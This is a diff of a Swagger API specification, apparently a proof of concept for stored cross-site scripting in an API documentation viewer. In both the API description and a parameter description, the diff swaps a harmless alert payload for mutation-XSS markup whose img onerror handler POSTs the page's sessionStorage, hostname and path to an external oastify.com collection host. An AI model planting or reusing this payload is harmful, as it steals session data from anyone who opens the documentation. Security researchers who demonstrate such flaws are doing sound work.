@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation (POC Purpose Only)
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(JSON.stringify(sessionStorage)) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://pqjt6vrqnrm2xb88m8vkpm3k7bd21zpo.oastify.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(JSON.stringify(sessionStorage)));" src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(JSON.stringify(sessionStorage)) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://pqjt6vrqnrm2xb88m8vkpm3k7bd21zpo.oastify.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(JSON.stringify(sessionStorage)));" src=1>"></form>
 
           format: int64
           in: path
